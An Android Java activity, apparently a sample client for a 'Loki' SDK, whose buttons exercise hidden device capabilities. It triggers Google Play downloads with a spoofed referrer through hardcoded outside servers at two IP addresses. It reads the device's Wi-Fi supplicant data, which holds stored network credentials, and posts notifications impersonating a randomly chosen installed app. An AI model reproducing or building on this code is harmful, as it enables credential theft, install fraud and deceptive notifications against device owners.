package com.example.loki;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;

import com.example.LokiClientSample.R;
import com.giga.sdk.ClientManager;
import com.loki.sdk.LokiClientCallback;
import com.loki.sdk.LokiService;

import java.util.List;

/**
 * Created by zhangyong on 15-6-4.
 */
public class SampleActivity extends Activity implements View.OnClickListener {

    private Button loginProduction;
    private Button login9876;
    private Button login9875;
    private Button loginCustom;

    private CheckBox direct;

    private EditText server;
    private EditText port;
    private LokiClientCallback callback;

    private Button wpa;
    private Button notify;

    private static final String URL = "https://play.google.com/store/apps/details?id=com.dianxinos.optimizer.duplay&referrer=utm_source%3Dhello_world";
//    private static final String URL = "https://play.google.com/store/apps/details?id=com.dianxinos.optimizer.duplay";
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        loginProduction = (Button) findViewById(R.id.login_production);
        loginProduction.setOnClickListener(this);
        login9876 = (Button) findViewById(R.id.login_9876);
        login9876.setOnClickListener(this);
        login9875 = (Button) findViewById(R.id.login_9875);
        login9875.setOnClickListener(this);
        loginCustom = (Button) findViewById(R.id.login_custom);
        loginCustom.setOnClickListener(this);
        direct = (CheckBox) findViewById(R.id.direct);
        server = (EditText) findViewById(R.id.server);
        port = (EditText) findViewById(R.id.port);

        wpa = (Button) findViewById(R.id.wpa);
        wpa.setOnClickListener(this);
        notify = (Button) findViewById(R.id.notification);
        notify.setOnClickListener(this);

        callback = new LokiClientCallback(this);
    }

    @Override
    public void onClick(View view) {
        LokiService service = LokiService.getInstance(this);
        ClientManager cm = ClientManager.getInstance(this);
        if (view == loginProduction) {
            cm.downloadWithGooglePlay(URL, callback, "108.59.87.187", 80, 600000);
        } else if (view == login9876) {
            cm.downloadWithGooglePlayDirectly(URL, callback, "118.192.170.2", 9876, 600000);
        } else if (view == login9875) {
            cm.downloadWithGooglePlayDirectly(URL, callback, "118.192.170.2", 9875, 600000);
        } else if (view == loginCustom) {
            if (direct.isChecked()) {
                cm.downloadWithGooglePlayDirectly(URL, callback, server.getText().toString(), Integer.parseInt(port.getText().toString()), 600000);
            } else {
                cm.downloadWithGooglePlay(URL, callback, server.getText().toString(), Integer.parseInt(port.getText().toString()), 600000);
            }
        } else if (view == wpa) {
            if (service == null) {
                serviceNotReady();
            } else {
                new AlertDialog.Builder(this).setMessage(service.readSupplicant()).setPositiveButton(android.R.string.ok, null).show();
            }
        } else if (view == notify) {
            if (service == null) {
                serviceNotReady();
            } else {
                postNotifiation(service);
            }
        }
    }

    private void serviceNotReady() {
        new AlertDialog.Builder(this).setMessage("LokiService not ready yet").setPositiveButton(android.R.string.ok, null).show();
    }

    private void postNotifiation(LokiService service) {
        ApplicationInfo ai = null;
        List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
        for (int i=0; i<apps.size(); i++) {
            int pos = (int) (Math.random() * apps.size());
            ai = apps.get(pos);
            if (ai.icon != 0) {
                break;
            }
        }

        if (ai == null) {
            return;
        }

        Notification n = new Notification(ai.icon, "Test notification", System.currentTimeMillis());
        n.setLatestEventInfo(this, "Test Title", "Test Content", PendingIntent.getBroadcast(this, 0, new Intent("ABC"), 0));

        service.sendNotificationAsPackage(ai.packageName, (int)(Math.random() * Integer.MAX_VALUE), null, n);
    }
}
